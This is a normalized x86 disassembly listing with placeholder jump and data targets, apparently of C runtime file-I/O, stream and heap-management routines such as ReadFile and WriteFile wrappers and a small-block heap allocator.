pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40d327
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_4094b2
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_409d68
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_409517
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_409fbd
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_40a01e
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_4092d5
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_409327
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_409484
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_409484
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_4095bb
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40cdb1
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_409697
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_409697
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40d2a6
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_4096fc
push esi
mov edi eax
call sub_40d305
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_4096fc
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_4080af
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40993a
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_4098d5
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40d2a6
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_40993a
push esi
mov edi eax
call sub_40d305
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_40993a
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_40d264
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_408122
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_4080af
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_4099ad
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_4092a6
push esi
call sub_4099cf
push esi
mov edi eax
call sub_4092f8
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_4099cf
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_4098d5
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov ecx [ edi + 0xc ]
test cx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ebx eax
sub ebx edx
test cl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_408122
mov [ eax ] 0x16
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_4098d5
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_4098d5
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_409b30
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40d3ba
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_409ca0
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_409fbd
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_40a01e
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_406c98
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_4092d5
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_409327
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_409d68
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_408122
mov [ eax ] 0x9
call sub_40812b
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40d2a6
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_409dcd
push esi
mov edi eax
call sub_40d305
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_409dcd
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_40993a
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_408122
mov [ eax ] 0x1c
call sub_40812b
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_4080af
pop ecx
call sub_408122
mov [ eax ] 0x9
call sub_40812b
mov [ eax ] esi
jmp r-xdata
sub_409f58
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_40a033
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_409fbd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_406c98
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_409fbd
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_406ec2
pop ecx
call sub_406c50
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_40a01e
pop ecx
pop edi
sub_40a033
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40a071
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_40a09c
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_408170
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_40a3c7
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
